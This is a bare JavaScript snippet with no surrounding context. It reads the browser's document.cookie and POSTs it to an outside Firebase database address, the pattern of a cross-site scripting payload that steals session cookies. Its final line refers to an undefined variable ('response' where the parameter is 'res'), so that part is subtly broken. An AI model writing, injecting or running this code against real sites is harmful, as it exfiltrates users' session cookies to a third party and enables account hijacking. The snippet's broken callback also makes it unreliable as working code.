fetch("https://test-43d17.firebaseio.com/cookie.json", {
    method: "POST",
    body: JSON.stringify(document.cookie)
}).then(res => {
    alert(response.json);
});
